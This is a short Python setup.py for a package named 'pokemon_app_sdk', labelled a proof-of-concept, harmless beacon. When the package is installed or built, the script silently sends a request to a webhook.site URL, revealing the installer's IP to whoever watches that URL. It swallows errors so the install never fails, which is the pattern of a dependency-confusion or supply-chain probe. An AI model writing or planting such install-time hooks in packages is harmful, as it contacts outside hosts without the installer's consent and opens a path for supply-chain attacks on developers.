from setuptools import setup
import urllib.request

# Your webhook.site URL (will show installer’s source IP)
BEACON_URL = "https://webhook.site/696dbb7b-03c5-4a0f-b40e-c3da6ef25a46"

def beacon_once():
    try:
        # Perform a simple GET request (no data sent)
        req = urllib.request.Request(BEACON_URL, method="GET")
        with urllib.request.urlopen(req, timeout=3):
            pass
    except Exception:
        # Ignore errors so install never breaks
        pass

# Trigger beacon at install/build time
beacon_once()

# Standard setup call
setup(
    name="pokemon_app_sdk",
    version="0.17.0",
    packages=["pokemon_app_sdk"],
    description="POC package (harmless beacon-only)",
)
